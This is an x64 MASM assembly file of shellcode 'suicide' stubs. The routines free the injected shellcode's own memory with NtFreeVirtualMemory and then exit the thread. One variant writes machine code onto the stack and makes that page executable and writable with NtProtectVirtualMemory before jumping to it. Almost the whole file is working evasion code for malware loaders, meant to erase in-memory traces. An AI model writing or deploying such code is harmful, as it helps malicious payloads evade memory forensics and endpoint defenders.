; ml64.exe /c /Fo suicide.obj .\suicide.asm

; Define a segment that you want the linker to recognize as part of ".stub"
_STUB SEGMENT PARA 'CODE' ALIAS('.stub') 
_STUB ENDS

; Tell MASM to assemble subsequent code into this _STUB segment
_STUB SEGMENT

    Suicide PROC
        ; On entry (x64 __fastcall from C++):
        ; RCX = pBaseAddressToFree (pResources->ResourceBase)
        ; RDX = resolved_pfnNtFreeVirtualMemory
        ; R8  = resolved_pfnRtlExitUserThread

        ; --- Use Registers to hold inputs ---
        mov r12, rcx  ; r12 = pBaseAddressToFree
        mov r13, rdx  ; r13 = pfnNtFreeVirtualMemory
        mov r14, r8   ; r14 = pfnRtlExitUserThread

        ; --- Allocate minimal stack space for NTVM pointer arguments ---
        sub rsp, 30h ; (48 bytes). 2 values + pointers + shadow space needed by NTVM via JMP

        ; Store values on the stack
        mov qword ptr [rsp + 20h], r12   ; [rsp+20h] = pBaseAddressToFree value (8 bytes)
        mov qword ptr [rsp + 28h], 0     ; [rsp+28h] = RegionSize value (0) (8 bytes)

        ; --- Set up registers for NtFreeVirtualMemory Call ---
        xor rcx, rcx
        dec rcx             ; RCX = NT_CURRENT_PROCESS (-1)

        lea rdx, [rsp + 20h] ; RDX = Pointer to pBaseAddressValue
        lea r8, [rsp + 28h]  ; R8 = Pointer to RegionSizeValue

        mov r9d, 8000h      ; R9 = MEM_RELEASE (0x8000)

        push r14 ; This reduces RSP by 8.

        ; int 3
        ; --- Jump to NtFreeVirtualMemory ---
        jmp r13

    Suicide ENDP


    ; PUBLIC AddTwoNumbers ; Make it callable from C++
    AddTwoNumbers PROC

        ; RCX will hold the first argument (a)
        ; RDX will hold the second argument (b)
        ; RAX will hold the return value
        mov rax, rcx            ; Move the first argument (a) from RCX to RAX
        add rax, rdx            ; Add the second argument (b) from RDX to RAX
        ; int 3
        ret                     ; Return to the caller (result is in RAX)
    AddTwoNumbers ENDP

    Backup_Suicide PROC

        ; On entry (x64 __fastcall from C++):
        ; RCX = pBaseAddressToFree
        ; RDX = resolved_pfnNtFreeVirtualMemory
        ; R8  = resolved_pfnRtlExitUserThread
        ; R9  = resolved_pfnNtProtectVirtualMemory

        push rbp
        mov rbp, rsp
        
        ; --- Save Callee-Saved Registers ---
        push rbx
        push rsi
        push rdi
        push r12
        push r13
        push r14

        ; --- Allocate Stack Space for Local Variables ---
        ; - Micro-stub code (e.g., 6 bytes for 'xor rcx, rcx; jmp r14')
        ; - NtProtectVirtualMemory arguments (PVOID* BaseAddress, PSIZE_T RegionSize, PULONG OldAccessProtection)
        ;   BaseAddress (8 bytes) + RegionSize (8 bytes) + OldAccessProtection (4 bytes) = 20 bytes for values.
        ;   The lowest RBP offset used for locals will be [rbp - 98h] for OldProtect.
        ;   So, we need at least 0xA0 (160 bytes) to cover this and provide padding for alignment.
        sub rsp, 0A0h ; Allocate 0xA0 (160 bytes) for this function's stack frame. Ensures 16-byte alignment.

        ; --- Store Incoming Arguments into Callee-Saved Registers ---
        mov r12, rcx                        ; r12 = pBaseAddressToFree (original shellcode's base address)
        mov r13, rdx                        ; r13 = pfnNtFreeVirtualMemory
        mov r14, r8                         ; r14 = pfnRtlExitUserThread (used by micro-stub)
        mov r15, r9                         ; r15 = pfnNtProtectVirtualMemory


        ;-----------------------------------------------------------------------------------------------------------------------
        ;        --- Call NtFreeVirtualMemory to free original shellcode memory ---

        xor rcx, rcx
        dec rcx                             ; RCX = 0xFFFFFFFFFFFFFFFF (NT_CURRENT_PROCESS)

        mov rax, r12                        ; RAX = pBaseAddressToFree (original shellcode base)
        mov qword ptr [rbp - 88h], rax      ; Store pBaseAddressToFree in local variable for RDX dereference
        lea rdx, [rbp - 88h]                ; RDX = Pointer to [rbp - 88h] (which holds the shellcode base)

        mov qword ptr [rbp - 90h], 0        ; Store 0 for RegionSize (required for MEM_RELEASE)
        lea r8, [rbp - 90h]                 ; R8 = Pointer to [rbp - 90h] (which holds RegionSize)

        mov r9d, 8000h                      ; R9D = MEM_RELEASE (0x8000)

        ; --- Stack Management for the NtFreeVirtualMemory Call ---
        lea rax, [rbp - 40h]                ; RAX = Address of the micro-stub on the stack
        sub rsp, 20h                        ; Allocate 0x20 bytes for shadow space

        ; push rax                            ; Push micro-stub address onto stack, RSP 8-byte aligned (original RSP - 0x20 - 0x8)
        push r14
        ; int 3
        jmp r13
        ; int 3

        ; lea rax, [rbp - 40h]                ; RAX = Address of the micro-stub on the stack
        ; jmp rax

        ;-----------------------------------------------------------------------------------------------------------------------

        ; --- Function Epilogue (will not be reached due to jmp to RtlExitUserThread) ---

        ;-----------------------------------------------------------------------------------------------

    Backup_Suicide ENDP


    SuicideByMicroStub PROC

        ; On entry (x64 __fastcall from C++):
        ; RCX = pBaseAddressToFree
        ; RDX = resolved_pfnNtFreeVirtualMemory
        ; R8  = resolved_pfnRtlExitUserThread
        ; R9  = resolved_pfnNtProtectVirtualMemory

        push rbp
        mov rbp, rsp
        
        ; --- Save Callee-Saved Registers ---
        push rbx
        push rsi
        push rdi
        push r12
        push r13
        push r14

        ; --- Allocate Stack Space for Local Variables ---
        ; - Micro-stub code (e.g., 6 bytes for 'xor rcx, rcx; jmp r14')
        ; - NtProtectVirtualMemory arguments (PVOID* BaseAddress, PSIZE_T RegionSize, PULONG OldAccessProtection)
        ;   BaseAddress (8 bytes) + RegionSize (8 bytes) + OldAccessProtection (4 bytes) = 20 bytes for values.
        ;   The lowest RBP offset used for locals will be [rbp - 98h] for OldProtect.
        ;   So, we need at least 0xA0 (160 bytes) to cover this and provide padding for alignment.
        sub rsp, 0A0h ; Allocate 0xA0 (160 bytes) for this function's stack frame. Ensures 16-byte alignment.

        ; --- Store Incoming Arguments into Callee-Saved Registers ---
        mov r12, rcx                        ; r12 = pBaseAddressToFree (original shellcode's base address)
        mov r13, rdx                        ; r13 = pfnNtFreeVirtualMemory
        mov r14, r8                         ; r14 = pfnRtlExitUserThread (used by micro-stub)
        mov r15, r9                         ; r15 = pfnNtProtectVirtualMemory

        ; --- Define and Store the Micro-stub on the Stack ---
        mov byte ptr [rbp - 40h], 48h       ; Micro-stub instruction 1: XOR RCX, RCX
        mov byte ptr [rbp - 3Fh], 31h
        mov byte ptr [rbp - 3Eh], 0C9h    
        mov byte ptr [rbp - 3Dh], 41h       ; Micro-stub instruction 2: JMP R14 (RtlExitUserThread)
        mov byte ptr [rbp - 3Ch], 0FFh
        mov byte ptr [rbp - 3Bh], 0E6h
        
        ; --- Call NtProtectVirtualMemory to make the STACK Page Executable ---

        xor rcx, rcx                        ; ProcessHandle (HANDLE ProcessHandle)
        dec rcx                             ; RCX = 0xFFFFFFFFFFFFFFFF (NT_CURRENT_PROCESS)

        ; Argument 2: BaseAddress (IN OUT PVOID *BaseAddress)
        ; RDX = Pointer to a PVOID variable holding the page-aligned address of the micro-stub.
        lea rax, [rbp - 40h]                ; RAX = Address of the micro-stub on the stack
        and rax, -1000h                     ; Page-align it downwards to get the stack page base address
        mov qword ptr [rbp - 88h], rax      ; Store the aligned stack page base address in a local variable
        lea rdx, [rbp - 88h]                ; RDX = Pointer to [rbp - 88h] (which holds the stack page base)

        mov qword ptr [rbp - 90h], 1000h    ; Store 0x1000 (one page) as a 64-bit SIZE_T in a local variable
        lea r8, [rbp - 90h]                 ; R8 = Pointer to [rbp - 90h] (which holds the region size)

        mov r9d, 40h                        ; R9D = PAGE_EXECUTE_READWRITE (0x40)

        mov dword ptr [rbp - 98h], 0        ; OldAccessProtection (OUT PULONG OldAccessProtection)
        lea rax, [rbp - 98h]                ; RAX = Pointer to [rbp - 98h]

        ; --- Stack Management for the NtProtectVirtualMemory Call ---
        sub rsp, 30h                        ; Shadow Space 32 + space for stack arguments ie. 0x20 (shadow) + 0x08 (5th arg) = 0x28 bytes.
        mov qword ptr [rsp + 20h], rax      ; Place the 5th argument

        ; int 3
        call r15

        ; --- Post-Call Cleanup ---
        add rsp, 30h                        ; Restore RSP from the NtProtectVirtualMemory call

        ;-----------------------------------------------------------------------------------------------------------------------
        ;        --- Call NtFreeVirtualMemory to free original shellcode memory ---

        xor rcx, rcx
        dec rcx                             ; RCX = 0xFFFFFFFFFFFFFFFF (NT_CURRENT_PROCESS)

        mov rax, r12                        ; RAX = pBaseAddressToFree (original shellcode base)
        mov qword ptr [rbp - 88h], rax      ; Store pBaseAddressToFree in local variable for RDX dereference
        lea rdx, [rbp - 88h]                ; RDX = Pointer to [rbp - 88h] (which holds the shellcode base)

        mov qword ptr [rbp - 90h], 0        ; Store 0 for RegionSize (required for MEM_RELEASE)
        lea r8, [rbp - 90h]                 ; R8 = Pointer to [rbp - 90h] (which holds RegionSize)

        mov r9d, 8000h                      ; R9D = MEM_RELEASE (0x8000)

        ; --- Stack Management for the NtFreeVirtualMemory Call ---
        lea rax, [rbp - 40h]                ; RAX = Address of the micro-stub on the stack
        sub rsp, 20h                        ; Allocate 0x20 bytes for shadow space

        push rax                            ; Push micro-stub address onto stack, RSP 8-byte aligned (original RSP - 0x20 - 0x8)
        ; int 3
        jmp r13
        ; int 3

        ; lea rax, [rbp - 40h]                ; RAX = Address of the micro-stub on the stack
        ; jmp rax

        ;-----------------------------------------------------------------------------------------------------------------------

        ; --- Function Epilogue (will not be reached due to jmp to RtlExitUserThread) ---

        ;-----------------------------------------------------------------------------------------------

    SuicideByMicroStub ENDP

_STUB ENDS ; End of this segment definition

END